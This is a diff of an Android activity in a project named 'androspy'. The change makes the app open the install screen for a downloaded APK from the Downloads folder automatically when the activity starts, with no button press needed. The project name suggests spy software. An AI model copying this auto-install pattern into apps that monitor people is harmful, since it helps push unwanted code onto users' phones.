@@ -1,8 +1,6 @@
 package buddy.ap.com.androspy;
 
-import android.content.ComponentName;
 import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.Environment;
@@ -13,25 +11,24 @@ import android.widget.Button;
 
 import java.io.File;
 
-public class PromptUpdateActivity extends AppCompatActivity {
+public class UpdateActivity extends AppCompatActivity {
     private Button btnUpdate;
     @Override
     public void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_prompt_update);
-
         btnUpdate = (Button) findViewById(R.id.update_btn);
-
         btnUpdate.setOnClickListener(new OnClickListener() {
             @Override
             public void onClick(View v) {
                 doUpdate();
             }
         });
+        doUpdate();
     }
 
     private void doUpdate() {
-        File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), UpdateApp.PKG_FILE);
+        File apkFile = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), UpdateService.PKG_FILE);
         Intent intent = new Intent(Intent.ACTION_VIEW);
         intent.setDataAndType(Uri.fromFile(apkFile), "application/vnd.android.package-archive");
         intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK); // without this flag android returned a intent error!
